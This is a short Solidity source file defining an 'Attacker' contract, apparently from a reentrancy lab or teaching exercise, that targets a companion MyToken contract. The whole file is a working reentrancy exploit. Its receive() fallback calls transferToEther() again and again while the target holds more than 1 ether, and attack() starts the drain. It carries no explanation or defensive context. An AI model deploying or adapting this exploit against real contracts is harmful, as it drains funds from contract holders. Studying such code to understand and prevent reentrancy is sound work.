// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./MyToken.sol";

contract Attacker {
    MyToken public myToken;

    constructor(address payable _myToken) {
        myToken = MyToken(_myToken);
    }

    receive() external payable {
        if (address(myToken).balance > 1 ether) {
            myToken.transferToEther();
        }
    }

    function attack() external payable {
        myToken.approve(address(myToken), 10 * 10**6);
        myToken.transferToEther();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
